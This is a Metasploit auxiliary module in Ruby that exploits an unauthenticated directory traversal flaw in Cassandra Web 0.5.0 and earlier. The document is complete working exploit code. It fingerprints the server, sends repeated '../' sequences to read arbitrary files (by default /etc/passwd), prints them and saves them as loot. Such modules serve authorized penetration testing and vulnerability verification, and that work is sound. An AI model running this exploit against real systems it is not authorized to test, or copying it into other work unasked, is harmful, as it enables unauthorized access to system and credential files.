##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Remote::HttpClient
  prepend Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Cassandra Web File Read Vulnerability',
        'Description' => %q{
          This module exploits an unauthenticated directory traversal vulnerability in Cassandra Web
          'Cassandra Web' version 0.5.0 and earlier, allowing arbitrary file read with the web server privileges.
          This vulnerability occured due to the disabled Rack::Protection module
        },
        'References' => [
          ['URL', 'https://github.com/avalanche123/cassandra-web/commit/f11e47a26f316827f631d7bcfec14b9dd94f44be'],
          ['EDB', '49362']
        ],
        'Author' => [
          'Jeremy Brown', # Vulnerability discovery
          'krastanoel' # Metasploit module
        ],
        'License' => MSF_LICENSE,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => []
        }
      )
    )

    register_options(
      [
        OptString.new('FILEPATH', [true, 'The path to the file to read', '/etc/passwd']),
        OptInt.new('DEPTH', [true, 'Traversal Depth (to reach the root folder)', 8]),
        OptInt.new('RPORT', [true, 'The Cassandra Web port (default: 3000)', 3000])
      ]
    )
  end

  def check_host(_ip)
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, '/')
    })

    return Exploit::CheckCode::Unknown('No response from the web service') if res.nil?
    return Exploit::CheckCode::Safe('Target is not a Cassandra Web server') if res.code != 200

    if res.headers['server'] == 'thin' && res.body.include?('Cassandra Web') && res.body.include?('/js/cassandra.js')
      return Exploit::CheckCode::Appears('Cassandra Web Detected')
    else
      return Exploit::CheckCode::Safe('Target is not a Cassandra Web server')
    end
  rescue ::Rex::ConnectionError
    return Exploit::CheckCode::Unknown('Could not connect to the web service')
  end

  def run_host(ip)
    traversal = '../' * datastore['DEPTH']
    filename = datastore['FILEPATH']
    filename = filename[1, filename.length] if filename =~ %r{^/}

    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, '/' "#{traversal}#{filename}")
    })

    fail_with(Failure::Unreachable, 'Connection failed') unless res
    fail_with(Failure::NotVulnerable, 'Connection failed. Nothing was downloaded') if res.code != 200
    fail_with(Failure::NotVulnerable, 'Nothing was downloaded. Change the DEPTH parameter') if res.body.include?('/js/cassandra.js')

    print_status('Downloading file...')
    print_line("\n#{res.body}\n")

    fname = datastore['FILEPATH']

    path = store_loot(
      'cassandra.web.traversal',
      'text/plain',
      ip,
      res.body,
      fname
    )
    print_good("File saved in: #{path}")
  rescue ::Rex::ConnectionError
    fail_with(Failure::Unreachable, "#{peer} - Could not connect to the web service")
  end
end
